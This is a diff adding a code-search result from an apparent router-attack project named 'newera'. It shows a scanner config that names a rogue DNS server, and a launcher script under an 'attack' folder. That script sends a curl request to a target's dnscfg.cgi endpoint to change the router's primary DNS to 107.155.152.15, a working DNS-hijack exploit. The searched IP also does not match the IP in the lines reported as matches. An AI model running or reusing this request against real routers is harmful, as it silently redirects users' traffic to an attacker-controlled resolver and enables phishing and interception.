@@ -1,0 +1,15 @@
+Searching 83 files for "107.155.132.186"
+
+C:\Users\Samsung\Desktop\newera\application\config.scanner.php:
+    2  
+    3  
+    4: $Configs["DNS"]["Servers"]["IPV4"][1]	= "107.155.152.15";
+    5  $Configs["DNS"]["Servers"]["IPV4"][2]	= "8.8.4.4";
+    6  $Configs["DNS"]["Servers"]["IPV6"][1]	= "0:0:0:0:0:ffff:b946:ba04";
+
+C:\Users\Samsung\Desktop\newera\application\launchers\attack\launch:
+    1  php api.php "$1" >/dev/null 2>&1 &
+    2: curl -s --connect-timeout 3 --max-time 3 --retry 0 "http://$1/dnscfg.cgi?dnsPrimary=107.155.152.15&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1" > /dev/null &
+    3  
+
+2 matches across 2 files
